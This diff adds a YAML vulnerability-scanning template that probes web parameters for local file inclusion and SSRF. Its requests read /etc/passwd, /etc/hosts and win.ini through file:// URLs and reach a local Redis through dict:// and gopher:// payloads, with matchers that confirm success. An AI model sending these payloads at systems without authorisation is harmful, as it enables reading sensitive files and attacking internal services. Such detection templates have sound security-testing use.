@@ -1,0 +1,29 @@
+id: m7-lfi-ssrf-chain
+info:
+  name: M7 - LFI to SSRF via File Protocol
+  author: Sharlix
+  severity: high
+  description: LFI chaining with file:// and dict:// protocols for SSRF escalation
+  tags: lfi,ssrf,protocol,chain,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=file:///etc/passwd"
+      - "{{BaseURL}}?file=file:///etc/hosts"
+      - "{{BaseURL}}?file=file:///windows/win.ini"
+      - "{{BaseURL}}?url=file:///etc/passwd"
+      - "{{BaseURL}}?path=file:///etc/passwd"
+      - "{{BaseURL}}?src=dict://127.0.0.1:6379/info"
+      - "{{BaseURL}}?url=gopher://127.0.0.1:6379/_INFO%0d%0a"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:x?:\d+:\d+:"
+          - "127\.0\.0\.1"
+          - "redis_version"
+          - "\+OK"
+        part: body
+        condition: or
